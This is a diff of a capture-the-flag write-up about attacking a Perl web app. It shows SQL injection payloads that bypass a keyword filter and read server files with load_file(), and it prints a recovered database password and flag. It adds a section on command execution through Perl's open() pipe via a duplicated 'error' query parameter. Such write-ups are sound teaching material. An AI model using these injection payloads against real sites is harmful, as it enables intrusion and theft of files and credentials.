@@ -65,33 +65,16 @@ Trying to insert an activated user or to update one also didn't work...
 
 ## Solution
 
-The main page says the Prof. likes snakes, which implies the website is written in python, so maybe we can inject a command.
 We're interested in the source code, but to know where it is we need to check lighttpd.conf first - because the website is powered by lighttpd.
 We can't deliver straight ASCII, because we might have characters which will bang the SQL query.
 
-To verify I can read files I started with '/bin/ls' which is always there
+We can use mySQL's load_file() to load a file, and hex() to encode it into hex:
 
-```email = "A' UNunionION SELselectECT ()open('/bin/ls').read().encode('hex'),1,1,1,1 #"```
-
-That didn't work... maybe it isn't written in python?
-
-Let's try to visit 
-
-http://\<IP\>/public/index.py - Nope!
-
-maybe
-
-http://\<IP\>/public/index.php - Nope :(
-
-http://\<IP\>/public/index.pl - It works!
-
-So the index page is written in perl.
-
-And to get the [configuration](lighttpd.conf) we can use the following query:
+So to get the [configuration](lighttpd.conf) we can use the following query:
 
 ```email = "A' UNunionION SELselectECT ()hex(load_file('/etc/lighttpd/lighttpd.conf')),1,1,1,1 #"```
 
-Which contains the name of our [index page (source)](index.pl), to get it we use:
+The result contains the name of our [index page (source)](index.pl), to get it we use:
 
 ```email = "A' UNunionION SELselectECT ()hex(load_file('/var/www/html/public/index.pl')),1,1,1,1 #"```
 
@@ -101,6 +84,53 @@ Inside we can see that the flag is loaded from '../private/config.ini', so we ge
 
 which gives us:
 
-[Database] Password=BlulS@ablul [CTF] Flag=ILov3P3rl43v3r
+>[Database] Password=BlulS@ablul [CTF] Flag=ILov3P3rl43v3r
+
+
+
+## RCE
+
+Inside the index page there are no execute() or system() functions, so RCE is not really straight forward.
+However, googling for "perl rce" landed me on [this](http://www.cgisecurity.com/lib/sips.html) page, which includes a section about how open() can be used for RCE:
+>If the filename begins with "|", the filename is interpreted as a command to which output is to be piped, and if the filename ends with a "|", the filename is interpreted as a command which pipes output to us.
+
+open() is being called from the get_template subroutine:
+
+	sub get_template {
+		my $filename = shift;
+
+		open (FILE, $filename);
+		my $output = <FILE>;
+		close(FILE);
+
+		return $output;
+	}
+
+Which is being called from  print_template:
+
+	sub print_template {
+		my $filename = shift;
+
+		print get_template($filename);
+	}
+
+This function is called 3 times, each time with an argument from the list :
+
+	my %templates = (
+		header => 'templates/header.html',
+		footer => 'templates/footer.html',
+		form => 'templates/form.html',
+		error => $query->param('error')
+	);
+
+"error" can be injected into, in the form of a parameter.
+Perl has a wierd way of expanding hashes, as I learned from [this](http://www.youtube.com/watch?v=noQcWra6sbU&t=6m33s) talk .
+
+We can use the same method to insert an arbitrary command to open.
+Any of the other variables (header, footer or form) can be replaced with a command in the following way:
+`http://\<IP\>/public/index.pl?error=e&error=form&error=|ls`
+
+Where the second parameter will be the variable we want to inject into, and the third will be the command executed. 
+We get the output piped to us.
 
 
